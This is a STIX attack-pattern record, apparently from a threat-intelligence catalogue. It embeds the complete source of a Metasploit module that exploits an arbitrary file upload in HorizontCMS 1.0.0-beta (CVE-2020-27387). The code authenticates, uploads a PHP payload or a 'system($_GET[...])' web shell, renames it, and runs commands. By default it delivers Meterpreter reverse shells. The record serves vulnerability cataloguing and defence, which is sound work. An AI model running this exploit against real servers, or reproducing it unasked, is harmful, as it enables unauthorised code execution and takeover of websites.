{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--e463666d-bbe0-49b4-862d-04540718c47d",
    "created": "2024-08-14T17:08:55.537454Z",
    "modified": "2024-08-14T17:08:55.537458Z",
    "name": "HorizontCMS Arbitrary PHP File Upload",
    "description": " This module exploits an arbitrary file upload vulnerability in HorizontCMS 1.0.0-beta in order to execute arbitrary commands.  The module first attempts to authenticate to HorizontCMS. It then tries to upload a malicious PHP file via an HTTP POST request to `/admin/file-manager/fileupload`. The server will rename this file to a random string. The module will therefore attempt to change the filename back to the original name via an HTTP POST request to `/admin/file-manager/rename`. For the `php` target, the payload is embedded in the uploaded file and the module attempts to execute the payload via an HTTP GET request to `/storage/file_name`. For the `linux` and `windows` targets, the module uploads a simple PHP web shell similar to `<?php system($_GET[\"cmd\"]); ?>`. Subsequently, it leverages the CmdStager mixin to deliver the final payload via a series of HTTP GET requests to the PHP web shell.  Valid credentials for a HorizontCMS user with permissions to use the FileManager are required. This would be all users in the Admin, Manager and Editor groups if HorizontCMS is configured with the default group settings.This module has been successfully tested against HorizontCMS 1.0.0-beta running on Ubuntu 18.04.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/horizontcms_upload_exec.rb",
            "external_id": "horizontcms_upload_exec.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2020-27387"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::CmdStager\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'HorizontCMS Arbitrary PHP File Upload',\n        'Description' => %q{\n          This module exploits an arbitrary file upload vulnerability in\n          HorizontCMS 1.0.0-beta in order to execute arbitrary commands.\n\n          The module first attempts to authenticate to HorizontCMS. It then tries\n          to upload a malicious PHP file via an HTTP POST request to\n          `/admin/file-manager/fileupload`. The server will rename this file to a\n          random string. The module will therefore attempt to change the filename\n          back to the original name via an HTTP POST request to\n          `/admin/file-manager/rename`. For the `php` target, the payload is\n          embedded in the uploaded file and the module attempts to execute the\n          payload via an HTTP GET request to `/storage/file_name`. For the `linux`\n          and `windows` targets, the module uploads a simple PHP web shell\n          similar to `<?php system($_GET[\"cmd\"]); ?>`. Subsequently, it leverages\n          the CmdStager mixin to deliver the final payload via a series of HTTP\n          GET requests to the PHP web shell.\n\n          Valid credentials for a HorizontCMS user with permissions to use the\n          FileManager are required. This would be all users in the Admin, Manager\n          and Editor groups if HorizontCMS is configured with the default group\n          settings.This module has been successfully tested against HorizontCMS\n          1.0.0-beta running on Ubuntu 18.04.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Erik Wynter' # @wyntererik - Discovery and Metasploit\n        ],\n        'References' => [\n          ['CVE', '2020-27387']\n        ],\n        'Payload' => {\n          'BadChars' => \"\\x00\\x0d\\x0a\"\n        },\n        'Platform' => %w[linux win php],\n        'Arch' => [ ARCH_X86, ARCH_X64, ARCH_PHP],\n        'Targets' => [\n          [\n            'PHP', {\n              'Arch' => [ARCH_PHP],\n              'Platform' => 'php',\n              'DefaultOptions' => {\n                'PAYLOAD' => 'php/meterpreter/reverse_tcp'\n              }\n            }\n          ],\n          [\n            'Linux', {\n              'Arch' => [ARCH_X86, ARCH_X64],\n              'Platform' => 'linux',\n              'DefaultOptions' => {\n                'PAYLOAD' => 'linux/x64/meterpreter/reverse_tcp'\n              }\n            }\n          ],\n          [\n            'Windows', {\n              'Arch' => [ARCH_X86, ARCH_X64],\n              'Platform' => 'win',\n              'DefaultOptions' => {\n                'PAYLOAD' => 'windows/x64/meterpreter/reverse_tcp'\n              }\n            }\n          ]\n        ],\n        'Privileged' => false,\n        'DisclosureDate' => '2020-09-24',\n        'DefaultTarget' => 0\n      )\n    )\n\n    register_options [\n      OptString.new('TARGETURI', [true, 'The base path to HorizontCMS', '/']),\n      OptString.new('USERNAME', [true, 'Username to authenticate with', '']),\n      OptString.new('PASSWORD', [true, 'Password to authenticate with', ''])\n    ]\n  end\n\n  def check\n    vprint_status('Running check')\n\n    # visit /admin/login to obtain HorizontCMS version plus cookies and csrf token\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path, 'admin', 'login'),\n      'keep_cookies' => true\n    })\n\n    unless res\n      return CheckCode::Unknown('Connection failed.')\n    end\n\n    unless res.code == 200 && res.body.include?('HorizontCMS')\n      return CheckCode::Safe('Target is not a HorizontCMS application.')\n    end\n\n    # obtain csrf token\n    html = res.get_html_document\n    @csrf_token = html.at('meta[@name=\"csrf-token\"]')['content']\n\n    # obtain version\n    /Version: (?<version>.*?)\\n/ =~ res.body\n\n    unless version\n      return CheckCode::Detected('Could not determine HorizontCMS version.')\n    end\n\n    # vulnerable versions all start with 1.0.0 followed by `-beta`, `-alpha` or `-alpha.<number>`\n    version_no, version_status = version.split('-')\n\n    unless version_no == '1.0.0' && version_status && (version_status.include?('alpha') || version_status.include?('beta'))\n      return CheckCode::Safe(\"Target is HorizontCMS with version #{version}\")\n    end\n\n    CheckCode::Appears(\"Target is HorizontCMS with version #{version}\")\n  end\n\n  def login\n    # check if @csrf_token is not blank, as this is required for authentication\n    if @csrf_token.blank?\n      fail_with(Failure::Unknown, 'Failed to obtain the csrf token required for authentication.')\n    end\n\n    # try to authenticate\n    # Cookies from this request will overwrite the cookies currently in the jar from the +check+ method\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, 'admin', 'login'),\n      'keep_cookies' => true,\n      'ctype' => 'application/x-www-form-urlencoded',\n      'vars_post' => {\n        '_token' => @csrf_token,\n        'username' => datastore['USERNAME'],\n        'password' => datastore['PASSWORD'],\n        'submit_login' => 'login'\n      }\n    })\n\n    unless res\n      fail_with(Failure::Unreachable, 'Connection failed while trying to authenticate.')\n    end\n\n    unless res.code == 302 && res.body.include?('Redirecting to')\n      fail_with(Failure::UnexpectedReply, 'Unexpected response received while trying to authenticate.')\n    end\n\n    # using send_request_cgi! does not work so we have to follow the redirect manually\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path, 'admin', 'dashboard')\n    })\n\n    unless res\n      fail_with(Failure::Unreachable, 'Connection failed while trying to authenticate.')\n    end\n\n    unless res.code == 200 && res.body.include?('Dashboard - HorizontCMS')\n      fail_with(Failure::UnexpectedReply, 'Unexpected response received while trying to authenticate.')\n    end\n\n    print_good('Successfully authenticated to the HorizontCMS dashboard')\n\n    # get new csrf token\n    html = res.get_html_document\n    @csrf_token = html.at('meta[@name=\"csrf-token\"]')['content']\n    if @csrf_token.blank?\n      fail_with(Failure::Unknown, 'Failed to obtain the csrf token required for uploading the payload.')\n    end\n  end\n\n  def upload_and_rename_payload\n    # set payload according to target platform\n    if target['Platform'] == 'php'\n      pl = payload.encoded\n    else\n      @shell_cmd_name = rand_text_alphanumeric(3..6)\n      pl = \"system($_GET[\\\"#{@shell_cmd_name}\\\"]);\"\n    end\n\n    @payload_name = rand_text_alphanumeric(8..12) << '.php'\n    print_status(\"Uploading payload as #{@payload_name}...\")\n\n    # generate post data\n    post_data = Rex::MIME::Message.new\n    post_data.add_part(@csrf_token, nil, nil, 'form-data; name=\"_token\"')\n    post_data.add_part('', nil, nil, 'form-data; name=\"dir_path\"')\n    post_data.add_part(\"<?php #{pl} ?>\", 'application/x-php', nil, \"form-data; name=\\\"up_file[]\\\"; filename=\\\"#{@payload_name}\\\"\")\n\n    # upload payload\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, 'admin', 'file-manager', 'fileupload'),\n      'ctype' => \"multipart/form-data; boundary=#{post_data.bound}\",\n      'headers' => { 'X-Requested-With' => 'XMLHttpRequest' },\n      'data' => post_data.to_s\n    })\n\n    unless res\n      fail_with(Failure::Disconnected, 'Connection failed while trying to upload the payload.')\n    end\n\n    unless res.code == 200 && res.body.include?('Files uploaded successfully!')\n      fail_with(Failure::Unknown, 'Failed to upload the payload.')\n    end\n\n    @payload_on_target = res.body.scan(/uploadedFileNames\":\\[\"(.*?)\"/).flatten.first\n    if @payload_on_target.blank?\n      fail_with(Failure::Unknown, 'Failed to obtain the new filename of the payload on the server.')\n    end\n\n    print_good(\"Successfully uploaded #{@payload_name}. The server renamed it to #{@payload_on_target}\")\n\n    # rename payload\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, 'admin', 'file-manager', 'rename'),\n      'ctype' => 'application/x-www-form-urlencoded; charset=UTF-8',\n      'headers' => { 'X-Requested-With' => 'XMLHttpRequest' },\n      'vars_post' => {\n        '_token' => @csrf_token,\n        'old_file' => \"/#{@payload_on_target}\",\n        'new_file' => \"/#{@payload_name}\"\n      }\n    })\n\n    unless res\n      fail_with(Failure::Disconnected, \"Connection failed while trying to rename the payload back to #{@payload_name}.\")\n    end\n\n    unless res.code == 200 && res.body.include?('File successfully renamed!')\n      fail_with(Failure::Unknown, \"Failed to rename the payload back to #{@payload_name}.\")\n    end\n\n    print_good(\"Successfully renamed payload back to #{@payload_name}\")\n  end\n\n  def execute_command(cmd, _opts = {})\n    send_request_cgi({\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path, 'storage', @payload_name),\n      'vars_get' => { @shell_cmd_name => cmd }\n    }, 0) # don't wait for a response from the target, otherwise the module will hang for a few seconds after executing the payload\n  end\n\n  def cleanup\n    # delete payload\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path, 'admin', 'file-manager', 'delete'),\n      'headers' => { 'X-Requested-With' => 'XMLHttpRequest' },\n      'vars_get' => {\n        '_token' => @csrf_token,\n        'file' => \"/#{@payload_name}\"\n      }\n    })\n\n    unless res && res.code == 200 && res.body.include?('File deleted successfully')\n      print_error('Failed to delete the payload.')\n      print_warning(\"Manual cleanup of #{@payload_name} is required.\")\n      return\n    end\n\n    print_good(\"Successfully deleted #{@payload_name}\")\n  end\n\n  def exploit\n    login\n    upload_and_rename_payload\n\n    # For `php` targets, the payload can be executed via a simlpe GET request. For other targets, a cmdstager is necessary.\n    if target['Platform'] == 'php'\n      print_status('Executing the payload...')\n      send_request_cgi({\n        'method' => 'GET',\n        'uri' => normalize_uri(target_uri.path, 'storage', @payload_name)\n      }, 0) # don't wait for a response from the target, otherwise the module will hang for a few seconds after executing the payload\n    else\n      print_status(\"Executing the payload via a series of HTTP GET requests to `/storage/#{@payload_name}?#{@shell_cmd_name}=<command>`\")\n      execute_cmdstager(background: true)\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2020-09-24",
    "x_mitre_platforms": [
        "win'"
    ]
}